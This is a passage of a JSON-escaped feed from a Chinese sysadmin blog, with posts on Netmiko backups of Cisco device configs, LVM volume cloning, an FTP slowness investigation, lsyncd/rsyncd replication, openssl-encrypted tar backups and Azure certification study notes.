\u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r2_e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r2-e2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.14\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003edevices\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003etw_bgp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r1_e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r1_e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r2_e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r2_e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003edev\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003edevices\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003econnection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eNetmiko\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eenable\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003eout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend_command\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;show running-config\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ecalender\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrftime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y%m\u003c/span\u003e\u003cspan class=\"si\"\u003e%d\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e{}\u003c/span\u003e\u003cspan class=\"s1\"\u003e-\u003c/span\u003e\u003cspan class=\"si\"\u003e{}\u003c/span\u003e\u003cspan class=\"s1\"\u003e.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"n\"\u003ecalender\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_name\u003c/span\u003e \u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eout\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edisconnect\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;BACKUP for \u003c/span\u003e\u003cspan class=\"si\"\u003e%s\u003c/span\u003e\u003cspan class=\"s2\"\u003e done\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"网络设备配置的备份"},{"content":"用pxe远程启动一个iscsi卷的方法已经会了的话。\n如果我们要批量产新虚机，最快的方法应该是把远程的iscsi卷clone一下，供新的虚机用，方法如下：\n在172.18.30.18上操作\n查看一下，原来有两个LV（逻辑卷）\n# lvdisplay\r那就把pvc-vis-18-31-48的lvm虚机卷，先copy做个mirror，-b参数表示后台运行。\n# lvconvert --type mirror --alloc anywhere -m1 /dev/vg-targetd/pvc-vis-18-31-48 -b\rLogical volume vg-targetd/pvc-vis-18-31-48 converted.\r提示一下就运行完毕了，虚假啊，后台正在运行同步信息：\nlvs -a -o +devices | egrep \u0026quot;LV|48\u0026quot;\r看那个Cpy\u0026amp;Sync，那个是进度条，才6.91，务必等走到100，再进行后续操作\n然后破开这个mirror，把副本命名为vis-18-31-49\n#lvconvert --splitmirrors 1 --name vis-18-31-49 /dev/vg-targetd/pvc-vis-18-31-48\rLogical volume vg-targetd/pvc-vis-18-31-48 converted.\r再运行 lvdisplay\n多出一个逻辑卷pvc-vis-18-31-49，之后我们就可以用这个新卷建立iscsi对象了。\n这个卷装的Linux是Centos 7 last，网卡是dhcp，可以当模板复用。\n","permalink":"https://rendoumi.com/posts/20231208-iscsi_lv_clone/","summary":"\u003cp\u003e用pxe远程启动一个iscsi卷的方法已经会了的话。\u003c/p\u003e\n\u003cp\u003e如果我们要批量产新虚机，最快的方法应该是把远程的iscsi卷clone一下，供新的虚机用，方法如下：\u003c/p\u003e\n\u003cp\u003e在172.18.30.18上操作\u003c/p\u003e\n\u003cp\u003e查看一下，原来有两个LV（逻辑卷）\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e # lvdisplay\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-iscsi_lv_clone/2020-10-15_165500.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那就把pvc-vis-18-31-48的lvm虚机卷，先copy做个mirror，-b参数表示后台运行。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e# lvconvert --type mirror --alloc anywhere -m1 /dev/vg-targetd/pvc-vis-18-31-48 -b\r\n  Logical volume vg-targetd/pvc-vis-18-31-48 converted.\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提示一下就运行完毕了，虚假啊，后台正在运行同步信息：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003elvs -a -o +devices | egrep \u0026quot;LV|48\u0026quot;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-iscsi_lv_clone/2020-10-15_165157.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看那个Cpy\u0026amp;Sync，那个是进度条，才6.91，务必等走到100，再进行后续操作\u003c/p\u003e\n\u003cp\u003e然后破开这个mirror，把副本命名为vis-18-31-49\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#lvconvert --splitmirrors 1 --name vis-18-31-49 /dev/vg-targetd/pvc-vis-18-31-48\r\n  Logical volume vg-targetd/pvc-vis-18-31-48 converted.\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再运行 lvdisplay\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-iscsi_lv_clone/2020-10-15_165555.png\"\u003e\u003c/p\u003e\n\u003cp\u003e多出一个逻辑卷pvc-vis-18-31-49，之后我们就可以用这个新卷建立iscsi对象了。\u003c/p\u003e\n\u003cp\u003e这个卷装的Linux是Centos 7 last，网卡是dhcp，可以当模板复用。\u003c/p\u003e","title":"lvm卷的clone方法"},{"content":"问题说明： 1、研发同事反馈应用程序上传一张图片耗时6分钟，让我们排查一下是什么问题？\n[INFO] 2022-03-01 17:16:38.295 [vu73wwv64ba4ncfzaiiou2qsem] [DubboServerHandler-172.18.32.254:20881-thread-2400] [FtpFile.java:854:uploadFileToPath()] uploadFileToPath path://c/product/590389/display/,fileName:display.jpg, cost:383667 ms 显示上传一张图片花了383667ms，没道理啊，这事自建的vsftp服务器，也没往oss桶里放东西的。\n问题排查： 1、登录到30.18上面查看vsftpd日志信息，过滤display.jpg的信息，发现上传信息是正常的。\n2、查看prometheus监控各项指标都很正常。唯有那个点的io比平时高一点，什么原因导致未知.\n3、查看vsftpd的全部日志信息，发现ftp每到一个目录就执行一个list操作，由于product目录下面文件很多，所以过了6分钟才相应结果，这就是导致ftp慢的原因。 [图片] 4、找研发部门验证，终于发现ftp公共组件，代码里确实有这个list操作。 总结：开发病得不清，判断目录是否存在居然每次都刷一下所有文件，太弱智了。\n","permalink":"https://rendoumi.com/posts/20231208-ftp_slowly/","summary":"\u003ch2 id=\"问题说明\"\u003e问题说明：\u003c/h2\u003e\n\u003cp\u003e1、研发同事反馈应用程序上传一张图片耗时6分钟，让我们排查一下是什么问题？\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eINFO\u003cspan class=\"o\"\u003e]\u003c/span\u003e 2022-03-01 17:16:38.295 \u003cspan class=\"o\"\u003e[\u003c/span\u003evu73wwv64ba4ncfzaiiou2qsem\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eDubboServerHandler-172.18.32.254:20881-thread-2400\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eFtpFile.java:854:uploadFileToPath\u003cspan class=\"o\"\u003e()]\u003c/span\u003e uploadFileToPath path://c/product/590389/display/,fileName:display.jpg, cost:383667 ms\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e显示上传一张图片花了383667ms，没道理啊，这事自建的vsftp服务器，也没往oss桶里放东西的。\u003c/p\u003e\n\u003ch2 id=\"问题排查\"\u003e问题排查：\u003c/h2\u003e\n\u003cp\u003e1、登录到30.18上面查看vsftpd日志信息，过滤display.jpg的信息，发现上传信息是正常的。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-ftp_slowly/2022-03-03_144142.png\"\u003e\u003c/p\u003e\n\u003cp\u003e2、查看prometheus监控各项指标都很正常。唯有那个点的io比平时高一点，什么原因导致未知.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-ftp_slowly/2022-03-03_144626.png\"\u003e\u003c/p\u003e\n\u003cp\u003e3、查看vsftpd的全部日志信息，发现ftp每到一个目录就执行一个list操作，由于product目录下面文件很多，所以过了6分钟才相应结果，这就是导致ftp慢的原因。\n[图片]\n\u003cimg loading=\"lazy\" src=\"/posts/20231208-ftp_slowly/2022-03-03_144753.png\"\u003e\u003c/p\u003e\n\u003cp\u003e4、找研发部门验证，终于发现ftp公共组件，代码里确实有这个list操作。\n\u003cimg loading=\"lazy\" src=\"/posts/20231208-ftp_slowly/2022-03-03_145030-17020249754001.png\"\u003e\u003c/p\u003e\n\u003cp\u003e总结：开发病得不清，判断目录是否存在居然每次都刷一下所有文件，太弱智了。\u003c/p\u003e","title":"开发投诉FTP慢问题的解决"},{"content":"公司使用智齿的机器崩了，要做数据迁移。\n由三台老机器迁移到三台新kvm机器\n我们需要把其中一台34.38的的东西实时同步两份，一份到30.18的glusterfs，一份到34.41的/data\n同时也要注意30.18的GFS中已经有两个虚机文件，32.6和34.38的qcow2\n所以lsync务必要小心，不能删除已有文件\n安装很简单：\nyum install epel-release yum install lsyncd 172.18.34.38上面的/etc/lsyncd.conf如下，同步到两个目的地： 注意下面的参数：\nmaxProcesses = 2 # 本机用于rsync的进程数\ndelete = \u0026lsquo;running\u0026rsquo; # 只删除lsync启动之后删除的文件，目的文件夹中原有的文件保存\nexclude = \u0026ldquo;upload\u0026rdquo; # 第二个同步中排除的目录，注意这里是匹配全路径中的部分字串，upload 可以匹配到 /data/new/chatmsg/upload/allajl.jpg，就upload目录下文件大，所以把它排除。**这里的规则是和rsync中exclude的写法不同的！！！**只取路径中的upload字串就可以排除。\n----\r-- User configuration file for lsyncd.\r--\r-- Simple example for default rsync, but executing moves through on the target.\r--\r-- For more examples, see /usr/share/doc/lsyncd*/examples/\r-- -- sync{default.rsyncssh, source=\u0026#34;/var/www/html\u0026#34;, host=\u0026#34;localhost\u0026#34;, targetdir=\u0026#34;/tmp/htmlcopy/\u0026#34;}\rsettings {\rlogfile = \u0026#34;/var/log/lsyncd/lsyncd.log\u0026#34;,\rstatusFile = \u0026#34;/var/log/lsyncd/lsyncd-status.log\u0026#34;,\rstatusInterval = 5,\rmaxProcesses = 2\r}\rsync {\rdefault.rsync,\rsource = \u0026#34;/data/new\u0026#34;,\rtarget = \u0026#34;172.18.30.18::new\u0026#34;,\rdelete = \u0026#39;running\u0026#39;,\rdelay = 5,\rrsync = {\rbinary = \u0026#34;/usr/bin/rsync\u0026#34;,\rarchive = true,\rcompress = false,\rverbose = true\r}\r}\rsync {\rdefault.rsync,\rsource = \u0026#34;/data\u0026#34;,\rtarget = \u0026#34;172.18.34.41::new\u0026#34;,\rdelete = \u0026#39;running\u0026#39;,\rexclude = \u0026#34;upload\u0026#34;,\rdelay = 5,\rrsync = {\rbinary = \u0026#34;/usr/bin/rsync\u0026#34;,\rarchive = true,\rcompress = false,\rverbose = true\r}\r} 对端rsyncd的配置如下：\n# cat /etc/rsyncd.conf # /etc/rsyncd: configuration file for rsync daemon mode\r# See rsyncd.conf man page for more options.\r# configuration example:\r# uid = nobody\r# gid = nobody\r# use chroot = yes\r# max connections = 4\r# pid file = /var/run/rsyncd.pid\r# exclude = lost+found/\r# transfer logging = yes\r# timeout = 900\r# ignore nonreadable = yes\r# dont compress = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2\r# [ftp]\r# path = /home/ftp\r# comment = ftp export area\ruid = root\rgid = root\ruse chroot = no\rmax connections = 200\rtimeout = 300\rpid file = /var/run/rsyncd.pid\rlock file = /var/run/rsync.lock\rlog file = /var/log/rsyncd.log\r[new]\rpath = /root\rignore errors\rread only = false\rlist = false\rhosts allow = 172.18.34.38\rhosts deny = 0.0.0.0/32 注意：如果目录下文件数过多，需要加大内核watches指标\nfs.inotify.max_user_watches=524288 这是个极端强力的工具，墙裂推荐！。\n","permalink":"https://rendoumi.com/posts/20231208-lsync/","summary":"\u003cp\u003e公司使用智齿的机器崩了，要做数据迁移。\u003c/p\u003e\n\u003cp\u003e由三台老机器迁移到三台新kvm机器\u003c/p\u003e\n\u003cp\u003e我们需要把其中一台34.38的的东西实时同步两份，一份到30.18的glusterfs，一份到34.41的/data\u003c/p\u003e\n\u003cp\u003e同时也要注意30.18的GFS中已经有两个虚机文件，32.6和34.38的qcow2\u003c/p\u003e\n\u003cp\u003e所以lsync务必要小心，不能删除已有文件\u003c/p\u003e\n\u003cp\u003e安装很简单：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install lsyncd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e172.18.34.38上面的/etc/lsyncd.conf如下，同步到两个目的地：\n注意下面的参数：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003emaxProcesses = 2 # 本机用于rsync的进程数\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003edelete = \u0026lsquo;running\u0026rsquo; # 只删除lsync启动之后删除的文件，目的文件夹中原有的文件保存\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eexclude = \u0026ldquo;upload\u0026rdquo; # 第二个同步中排除的目录，注意这里是匹配全路径中的部分字串，upload 可以匹配到 /data/new/chatmsg/upload/allajl.jpg，就upload目录下文件大，所以把它排除。**这里的规则是和rsync中exclude的写法不同的！！！**只取路径中的upload字串就可以排除。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e----\r\n-- User configuration file for lsyncd.\r\n--\r\n-- Simple example for default rsync, but executing moves through on the target.\r\n--\r\n-- For more examples, see /usr/share/doc/lsyncd*/examples/\r\n-- \r\n-- sync{default.rsyncssh, source=\u0026#34;/var/www/html\u0026#34;, host=\u0026#34;localhost\u0026#34;, targetdir=\u0026#34;/tmp/htmlcopy/\u0026#34;}\r\n\r\nsettings {\r\n    logfile = \u0026#34;/var/log/lsyncd/lsyncd.log\u0026#34;,\r\n    statusFile = \u0026#34;/var/log/lsyncd/lsyncd-status.log\u0026#34;,\r\n    statusInterval = 5,\r\n    maxProcesses = 2\r\n}\r\n\r\nsync {\r\n    default.rsync,\r\n    source = \u0026#34;/data/new\u0026#34;,\r\n    target = \u0026#34;172.18.30.18::new\u0026#34;,\r\n    delete = \u0026#39;running\u0026#39;,\r\n    delay = 5,\r\n    rsync     = {\r\n        binary = \u0026#34;/usr/bin/rsync\u0026#34;,\r\n        archive = true,\r\n        compress = false,\r\n        verbose   = true\r\n    }\r\n}\r\n\r\nsync {\r\n    default.rsync,\r\n    source = \u0026#34;/data\u0026#34;,\r\n    target = \u0026#34;172.18.34.41::new\u0026#34;,\r\n    delete = \u0026#39;running\u0026#39;,\r\n    exclude = \u0026#34;upload\u0026#34;,\r\n    delay = 5,\r\n    rsync     = {\r\n        binary = \u0026#34;/usr/bin/rsync\u0026#34;,\r\n        archive = true,\r\n        compress = false,\r\n        verbose   = true\r\n    }\r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对端rsyncd的配置如下：\u003c/p\u003e","title":"Lsync 同步软件的运用"},{"content":"审计的需求，需要定期备份文件，为了安全起见，这些压缩包需要加密保存，恢复的时候需要密码才能恢复：\n把目录 20231224压缩进加密包：\ntar -zcvf - 20231224|openssl des3 -salt -k \u0026lt;password\u0026gt; | dd of=/backup/cdrom/20231224.tar.gz.des3 解压：\ndd if=/backup/cdrom/20231224.tar.gz.des3 |openssl des3 -d -k \u0026lt;password\u0026gt;|tar zxf - ","permalink":"https://rendoumi.com/posts/20231208-encrypt_tar/","summary":"\u003cp\u003e审计的需求，需要定期备份文件，为了安全起见，这些压缩包需要加密保存，恢复的时候需要密码才能恢复：\u003c/p\u003e\n\u003cp\u003e把目录 20231224压缩进加密包：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -zcvf - 20231224\u003cspan class=\"p\"\u003e|\u003c/span\u003eopenssl des3 -salt -k \u0026lt;password\u0026gt; \u003cspan class=\"p\"\u003e|\u003c/span\u003e dd \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/backup/cdrom/20231224.tar.gz.des3\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解压：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/backup/cdrom/20231224.tar.gz.des3 \u003cspan class=\"p\"\u003e|\u003c/span\u003eopenssl des3 -d -k \u0026lt;password\u0026gt;\u003cspan class=\"p\"\u003e|\u003c/span\u003etar zxf -\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linux加密压缩tar包"},{"content":"在今年微软的挑战中拿了两张免费考卷，考了AZ-104和AZ-305，捞了一张专家证书，今年的考试到头了。\n明年用免费azure考试抵扣税，真是一件好事。\n","permalink":"https://rendoumi.com/posts/20230921-azure_certificate/","summary":"\u003cp\u003e在今年微软的挑战中拿了两张免费考卷，考了AZ-104和AZ-305，捞了一张专家证书，今年的考试到头了。\u003c/p\u003e\n\u003cp\u003e明年用免费azure考试抵扣税，真是一件好事。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230921152431697\" loading=\"lazy\" src=\"/posts/20230921-azure_certificate/image-20230921152431697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230921152857868\" loading=\"lazy\" src=\"/posts/20230921-azure_certificate/image-20230921152857868.png\"\u003e\u003c/p\u003e","title":"今年下半年的两张Azure认证"},{"content":"在今年微软的挑战中拿了两张免费考卷，一张是115$，怕浪费啊，就分别考了AZ-104和AZ-305，基本上你104能过，305就没有问题，az-104挺多知识点的，最讨厌的是步骤题，不知道死记那些步骤有何意思，把104的知识要点分列如下：\nResourceGroup的 Tag不会被resource继承，新建的policy只针对新添加和更新的resource生效，对没有修改的resource不生效，另外需要关注policy的defination是只针对resource还是包括resource groups Adds the specified tag and value when any resource missing this tag is created or updated. Existing resources can be remediated by triggering a remediation task. If the tag exists with a different value it will not be changed. Does not modify tags on resource groups.\nResize Availability Set下的VM， 需要停止Availability Set下所有的VM If the VM you wish to resize is part of an availability set, then you must stop all VMs in the availability set before changing the size of any VM in the availability set.\nThe number of fault domains for managed availability sets varies by region - either two or three per region. Each virtual machine in your availability set is assigned an update domain and a fault domain by the underlying Azure platform. For a given availability set, five non-user-configurable update domains are assigned by default (Resource Manager deployments can then be increased to provide up to 20 update domains) to indicate groups of virtual machines and underlying physical hardware that can be rebooted at the same time.\nYou need to make sure that the password cannot be stored in plain text.You are preparing to create the necessary components to achieve your goal. Key vault + access 